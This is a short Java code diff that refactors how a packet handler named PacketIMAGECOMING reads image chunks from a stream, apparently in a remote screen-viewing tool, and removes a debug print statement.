@@ -71,9 +71,9 @@ public class PacketIMAGECOMING extends AbstractPacket {
 				for (int x = 0; x < rows; x++) {  
 		            for (int y = 0; y < cols; y++) {  
 		            	chunks++;
-		            	if (slave.getDataInputStream().readBoolean()) {		  
+		            	if (slave.readBoolean()) {		  
 		            		updatedChunks++;
-		            		int blen = slave.getDataInputStream().readInt();
+		            		int blen = slave.readInt();
 							byte[] buffer = new byte[blen];
 							slave.getDataInputStream().readFully(buffer);
 							
@@ -91,7 +91,6 @@ public class PacketIMAGECOMING extends AbstractPacket {
 							size += blen;
 		            	}	
 		            	frame.setTotalChunks(chunks);
-		            	System.out.println("Total chunks: " + chunks + " " + x + " " + y);
 		            }
 				}
 				
